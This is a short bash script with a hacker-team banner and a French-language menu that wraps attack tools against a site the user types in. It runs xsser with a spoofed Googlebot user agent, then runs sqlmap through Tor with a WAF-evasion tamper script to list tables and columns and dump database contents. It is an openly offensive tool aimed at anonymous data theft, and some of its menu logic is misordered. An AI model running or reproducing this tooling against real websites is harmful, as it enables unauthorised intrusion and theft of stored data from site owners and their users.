#!/bin/bash

clear
echo "'####::'######::'##:::'##::::'########:'########::::'###::::'##::::'##:"
echo ". ##::'##... ##: ##::'##:::::... ##..:: ##.....::::'## ##::: ###::'###:"
echo ": ##:: ##:::..:: ##:'##::::::::: ##:::: ##::::::::'##:. ##:: ####'####:"
echo ": ##::. ######:: #####:::::::::: ##:::: ######:::'##:::. ##: ## ### ##:"
echo ": ##:::..... ##: ##. ##::::::::: ##:::: ##...:::: #########: ##. #: ##:"
echo ": ##::'##::: ##: ##:. ##:::::::: ##:::: ##::::::: ##.... ##: ##:.:: ##:"
echo "'####:. ######:: ##::. ##::::::: ##:::: ########: ##:::: ##: ##:::: ##:"
echo "....:::......:::..::::..::::::::..:::::........::..:::::..::..:::::..::"
echo "                                                        BY SULFUR      "


read -p 'Entrez votre Site : ' nom
while [[ $nb != 5 ]]
do
echo "----------------------------------------------------"
echo "(1) - Test de vulnerabilite"
echo "(2) - Afficher les tables"
echo "(3) - Afficher les colones"
echo "(4) - Afficher les donnees"
echo "(5) - Exit"
read -p 'Entrez votre choix : ' nb

if test $nb -eq 1
then
xsser -u "$nom" -i /root/None -s -v --user-agent "Googlebot/2.1 (+http://www.google.com/bot.html)" --threads 5 --timeout 30 --retries 1 --delay 0 --auto
elif test $nb -eq 2 
read -p 'Base : ' db
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" --tables --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py
elif test $nb -eq 3
then
read -p 'Table : ' tb
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" -T "$tb" --columns --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py
read -p 'Colone : ' cl
elif test $nb -eq 4
then
sqlmap --tor --tor-type=SOCKS5 -u "$nom" -D "$db" -T "$tb" -C "$cl" --tamper /usr/share/sqlmap/tamper/space2mssqlblank.py --dump
else
echo "Cest pas logique "
fi
done
